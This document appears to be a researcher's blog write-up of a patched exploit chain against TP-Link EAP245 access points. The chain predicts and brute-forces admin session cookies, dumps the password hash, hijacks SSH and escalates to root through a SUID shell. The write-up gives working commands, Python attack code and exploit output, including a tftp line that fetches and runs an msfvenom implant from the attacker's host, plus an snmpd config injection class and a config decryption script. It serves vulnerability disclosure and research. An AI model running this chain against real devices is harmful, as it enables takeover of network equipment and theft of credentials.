# Exploiting a Predictable Session Cookie on the TP-Link EAP Series of Access Points

This covers the logic behind an exploit for a bug I found and reported over a year ago.
It has been patched but I've been thinking about how to improve my initial exploit for a while now as I think its a pretty interesting bug.

Haven't seen much documentation on how to exploit bugs like this, so I thought a writeup might be interesting.
Some information might have been forgotten, I did the reverse engineering a while ago.

There is no CVE for this bug, but patched from 5.0.4 onwards for the EAP245, different devices vary.

* [Video of the exploit](https://www.youtube.com/watch?v=HYZGLtaZPxI)
* [Exploit Source code](eap.py)


## The Bug

The bug is fairly simple and was pretty easy to identify.
Think I noticed within about an hour of looking at the device.

Cookies are of the form `IP_ADDRESS + TIMESTAMP`, so if you know the admins IP address and have a reasonable idea of when they logged in, you can guess their cookie.
IP Addresses in the cookies are not verified, so that isn't something to worry about.

As an example, consider the following cookie:
```
c0a80a050023d1fb
```
You can see that `c0a80a05` is `192.168.10.5` and `0023d1fb` is 2347515, roughly the time since boot.

Its worth noting that the cookies are generated on connection if one is not already set.

## Brute Forcing the Cookie

To bruteforce the cookie, we need to know:
* The Admins IP - Found no clever tricks here, you just need to know it.
* How to tell if we have a valid cookie - Easy enough.
* When the admin is logged in - hard, but we have a trick for that using a unusual side channel :)
* A range to consider, and how to search it.

### Detecting when Logged in

I chose to use the endpoint `/data/status.device.json?operation=read` as it gave an obviously bogus reply when you are not logged in:
```json
{
	"success":	true,
	"timeout":	true,
	"version":	"1.00",
	"mode":		"accessPoint",
	"status":	-1,
	"ip":		"192.168.1.33",
	"username":	"admin",
	"firstLogin":	false,
	"devInfo":	"EAP245"
}
```

192.168.1.33 was not the IP of the device and is static in the reply.

Compare this to the legitimate response of:
```json
{
	"error": 0,
	"success": true,
	"timeout": "false",
	"data":	{
		"deviceName": "EAP245-FF-EE-DD-CC-BB-AA",
		"deviceModel": "EAP245",
		"firmwareVersion": "5.0.x Build x Rel. x",
		"hardwareVersion": "3.0",
		"mac":	"FF-EE-DD-CC-BB-AA",
		"ip":	"192.168.1.1",
		"subnetMask":	"255.255.255.0",
		"lan_port_list": ["redacted"],
		"time":	"2022-10-00 00:00:00",
		"uptime": "0 days 00:59:00",
		"cpu": 99,
		"memory": 99
	}
}
```

### Predicting when an Admin is Logged in

This was a recent trick I discovered, where we can use a timing side channel to discover when someone connects.
It turns out when loading the homepage, there is a noticeable latency spike for plain http connections, which can be observed with ~10-20 requests a second.

Given this, we can cut the search range down to intervals where we have generated cookies in, which I did by considering a window of 10 seconds around a detected spike.

### Searching the Range

This is simple, just generate a candidate cookie by:
```
ADMINS_IP + GUESSED_TIME_STAMP
```
for every possible value in the range, in a multi-threaded loop.

With this candidate cookie, then just check if we are logged in with it.

## Getting the Password Hash

Now we have access, you'll want to know the password hash, so you can use it to login to the device without having to guess the cookie again in the future.
It is also needed for some later actions.
I'm aware of two ways of getting the password hash, but we'll focus on the easiest.
The second is documented in Misc Notes section.

When logged in, there is a useful endpoint that you can use to dump the password.
Send a request to `/data/userAccount.json` with post data `operation=read`, and it will return the username and password hash.

This is the same endpoint used to change the password, but it for some reason also supports reading it.

## Shell Access

The end goal is to pop a root shell, so lets do that.
We'll use the SSH session to get initial shell access, as I'm not currently aware of any bugs in the webui that can be used for command injection in the versions being considered.

### Initial Access

The device offers SSH support, but to login we need to know the password.
To work around this, my approach was to:
* enable SSH
* change the users password to a known one
* login via ssh
* change the password back to the known hash.

Then we have free access to a (restricted) shell.

### Breaking out of the guest account

I'm not sure they consider this a security boundary, but you need a way of breaking out of the existing guest shell.

To do this, I used the builtin debugger that you can access via `cliclientd` to run a shell command that creates a SUID shell.
```
cliclientd tdb "-r cp /bin/sh /tmp/sh"
cliclientd tdb "-r chmod 7777 /tmp/sh"
```

Then we can run whatever we want as root.

### File Transfer

After we are on the device, we want to get our implant on it.
Sadly, I couldn't get any of the local binaries to do the usual inline file transfer tricks so we are forced to rely on tftp (for now at least).

tftp is a UDP based protocol that can be used for file transfer, just a bit of a pain to setup a tftpd server to share your implant.
I found py3tftp[3] to be reasonable.

Copy the file over with:
```
tftp -g -r out.elf -l /tmp/out.elf YOURHOST
chmod +x /tmp/out.elf
/tmp/out.elf &
```

## Bringing it all together

Here is my complete exploit can be found in [eap.py](eap.py). Not the cleanest code, but hopefully easy enough to follow.
Start at the `exploit()` function, which is where the CLI starts.


It'll give output like:
```
$ python x.py 192.168.1.1 192.168.10.5 out.elf
INFO - Device: EAP245, Firmware: 5.0.3 Build 20210604 Rel. 51934
INFO - Found range 2346486:2348544
INFO - Spike detected, waiting 20 seconds
INFO - Starting cookie brute for range 2346486:2348544
INFO - valid cookie c0a80a050023d1fb (attempt 1:2347515)
INFO - Creds: admin:CEACDC2F5A0DC0D42FFB0372B9446CD6
INFO - Changing the user password to `badpassword`
INFO - trying shell!
INFO - got shell, attempt to privesc to root
INFO - Running the following as root: tftp -g -r out.elf -l /tmp/out.elf 192.168.10.5:9069 ; chmod +x /tmp/out.elf ; /tmp/out.elf &
INFO - Cleaning up
INFO - Resetting ssh status and user password back to the original
```

By the end, `out.elf` will be running, which in my tests was just something I produced with msfvenom.

## Misc Information

### tdp 

tdp is a TP-Link daemon that doesn't do very much on this specific device, basically just returns information like the IP, mac Address and various other things (including firmware version!)
It is far simpler than the binary that exists on home routers which have been targeted before[2][4].


Example output (IP, Mac Address and firmware version are blanked.):
```json
{
	"type": 1,
	"ip": "192.168.1.1",
	"mac": "FF-EE-DD-CC-BB-AA",
	"loginMode": 1,
	"manageMode": 0,
	"httpsPort": 443,
	"model": "EAP245",
	"name": "EAP245-FF-EE-DD-CC-BB-AA",
	"hardwareVersion": "3.0",
	"firmwareVersion": "5.0.x Build x Rel. x",
	"factoryStatus": false,
	"radioType": 17,
	"controllerHost": "",
	"version": 1
}
```

Here is a client if you are interested, part of which was included in the exploit for firmware detection:
```python3
import base64
import binascii
import json
import socket
import struct
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad

TIMEOUT = 1
target = (sys.argv[1], 20003)

keypair = RSA.generate(2048)
public_key_pem = keypair.public_key().export_key('PEM')

# worth noting if you upload ascii text, that isn't a key, it'll be kept around
# on disk as /tmp/RSA.PEM.
# this is written there and validated with PEM_read_RSA_PUBKEY, which needs a
# FD, but if that check fails they just don't delete the file.
payload = {
    'params':[
        {'version': 1, 'key': public_key_pem.decode('ascii'), 'load':'1'},
    ]
}

data = bytes(json.dumps(payload), encoding='ascii')
size = len(data)

# outside this opcode, it either errors or replies with a packet without any 
# data.
version = b'\x02\x00'
opcode = b'\x00\x01'
size_packed = struct.pack(">H", size)
header = \
    version + \
    opcode + \
    size_packed + \
    b'\xff\x01' + \
    b'\x00\x00' + \
    b'\x00\x00'

checksum = struct.pack(
    ">I",
    binascii.crc32(header + b'\x5a\x6b\x7c\x8d' + data)
)
message = header + checksum + data

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(TIMEOUT)
sock.sendto(message, target)

try:
    resp, _ = sock.recvfrom(1024)
    d = json.loads(resp[16:])
    message_key = base64.b64decode(d['key'])
    load = base64.b64decode(d['load'])
    cipher_rsa = PKCS1_OAEP.new(keypair)
    session_key = cipher_rsa.decrypt(message_key)
    key = session_key[:16]
    iv = session_key[16:]
    cipher_aes = AES.new(key, AES.MODE_CBC, iv)
    data = json.loads(unpad(cipher_aes.decrypt(load), AES.block_size))
    print(json.dumps(data))
except socket.timeout:
    pass
```

As noted in the comments, you can use it to create `/tmp/RSA.pem` that will persist in some cases.

### New Line Injection with the snmpd

The code to generate the snmpd config in the webui actually let you insert arbitrary lines in the config, as it didn't filter out newlines.
Not much you could do with it, as all the settings that could enable shell commands to be run are disabled.

Was reported along with this bug but I haven't verified if its still around.

Class to trigger the bug given a cookie, modify `payload()` to change it to what you want:
```python3
class TPLinkModifySNMPDConfig:
    """
    This is a post-authentication bug that allows you to add extra lines to the
    snmpd.conf, outside what is normally allowed.

    Sadly, all the fun stuff is disabled (i.e extended), so you'd probably need
    a bug in the config format reader to exploit it to get root.

    https://linux.die.net/man/5/snmpd.conf
    """
    SNMP_URL = 'http://%s/data/snmp.json'

    def __init__(self, host, cookie):
        self.host = host
        self.cookie = cookie
        self.r = requests.Session()
        self.r.cookies.set('COOKIE', self.cookie, domain=host)

    def exploit(self):
        """
        Use a reasonable exploitation method.
        """
        config = self.get_config()
        print("[!] Got SNMPD config, patching it")
        new_config = copy.deepcopy(config)
        new_config['snmpEnable'] = 'true'
        new_config['sysContact'] = \
            config['sysContact'].split('\n')[0] + self.payload()
        self.store_config(new_config)
        print("[!] Patched SNMPD config uploaded")

    def get_config(self):
        """
        Dump the original config, so it can be preserved.
        """
        r = self.r.post(
            self.SNMP_URL % self.host,
            data={
                'operation': 'read'
            },
            headers={
                'Referer': 'http://%s/' % self.host,
            }
        )
        return r.json()['data']

    def store_config(self, config):
        """
        Changes the configuration for the SNMPD
        """
        cmd = {'operation': 'write'}

        # very specific about the format for true/false.
        # so we have to make it lowercase before sending over.
        for key, value in config.items():
            if isinstance(value, bool):
                cmd[key] = str(value).lower()
            else:
                cmd[key] = value

        r = self.r.post(
            self.SNMP_URL % self.host,
            data=cmd,
            headers={
                'Referer': 'http://%s/' % self.host,
            }
        )
        return r.json()

    def payload(self):
        """
        Our SNMPD config modification
        """
        # Lines to add to the config
        # Currently just a new read only community called testing
        lines = [
            'rocommunity testing'
        ]
```

### Config File

You can also dump the config file and decrypt it, as documented here[1].
Same key, but if you want to find it yourself its in `libutility_lib.so`, look at the function called `md5_getConfigKey` and you'll see the reference to the location in the binary where the keys are.

Here is a python script to do this, which is a bit cleaner than what the original writeup did:
```python3
import binascii
import sys
import zlib
from Crypto.Cipher import DES

key = binascii.unhexlify(sys.argv[3])
f = open(sys.argv[1], 'rb').read()[148:]
cipher = DES.new(key, DES.MODE_ECB)
compressed = cipher.decrypt(f)

data = zlib.decompress(compressed)
open(sys.argv[2], 'wb').write(data)
```

### Cookie Invalidation Bug

Sometimes another cookie being generated invalidates the existing one.
This is a weird bug, that I've never figured out the reason for, which effects the reliability of this exploit.


## References

* [1] https://resolverblog.blogspot.com/2020/03/tp-link-cpe-510520-new-configbin.html
* [2] https://www.synacktiv.com/en/publications/pwn2own-tokyo-2020-defeating-the-tp-link-ac1750.html
* [3] https://github.com/sirMackk/py3tftp
* [4] https://www.zerodayinitiative.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo
